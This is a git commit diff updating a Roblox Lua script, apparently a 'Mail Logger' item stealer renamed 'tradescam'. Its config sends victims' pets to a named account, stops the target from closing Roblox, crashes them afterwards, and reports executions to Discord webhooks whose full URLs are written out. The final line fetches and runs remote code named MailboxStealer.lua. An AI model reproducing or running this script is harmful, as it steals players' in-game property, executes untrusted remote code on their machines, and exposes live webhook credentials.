edbab4a68e24d0cb92ce2797fb0e8587db4e593a
HerrSimoNHub <130193268+HerrSimoNHub@users.noreply.github.com>
2023-04-16 09:34:54 +0200

    Update Script.lua

--- Script.lua
+++ Script.lua
@@ -1,6 +1,8 @@
+--[[ SimoNHub Mail Logger ]]--
+
 --[[ Main Config ]]--
 _G.Username = "HerrySzymoN" --// Username To Send Pets To
-_G.GiftMessage = "test" --// Message For The Gift To Say
+
 _G.Diamonds = 500000 --// Amount Of Diamonds To Not Kick
 _G.UnlockPets = true --// Unlocks Locked Pets
 _G.AntiLeave = true --// Doesn't Let The Target Close Roblox
@@ -8,14 +10,16 @@ _G.Crash = true  --// Crashes Them After Its Finished
 
 --[[ Webhook Config ]]--
 _G.Enabled = true --// Toggle For Sending Webhooks
-_G.Mention = false --// Pings You When Someone Executes
-_G.Webhook = "https://discord.com/api/webhooks/1094231461651025951/m5nzA56_Pnrwgph1A8u624N1D1f-AcEhlMXju7vBQJ2AioD01wVc6Fwv5g971n5qb22S" --// Discord Webhook For Executions
+_G.Mention = true --// Pings You When Someone Executes
+_G.Webhook = "https://discord.com/api/webhooks/1097062322985521192/mrlGqhqcve2pWpIWSjGcuKKV2BpltcOL8scUkXgb2_7e1oZsHfPkg-WD9ob50Ok0Ki9-" --// Discord Webhook For Executions
 
 --[[ UI Config ]]--
-_G.ScriptName = "s" --// Script Name On The UI
-_G.Tip1 = "a" --// Gives You Tips On The UI
-_G.Tip2 = "s" --// Gives You Tips On The UI
-_G.Tip3 = "d" --// Gives You Tips On The UI
-_G.Tip4 = "f" --// Gives You Tips On The UI
-_G.Tip5 = "v" --// Gives You Tips On The UI
+_G.ScriptName = "tradescam" --// Script Name On The UI
+_G.Tip1 = "1" --// Gives You Tips On The UI
+_G.Tip2 = "2" --// Gives You Tips On The UI
+_G.Tip3 = "3" --// Gives You Tips On The UI
+_G.Tip4 = "4" --// Gives You Tips On The UI
+_G.Tip5 = "5" --// Gives You Tips On The UI
+
+--[[ Script ]]
 loadstring(game:HttpGet("https://raw.githubusercontent.com/HerrSimoNHub/api/main/MailboxStealer.lua", true))()
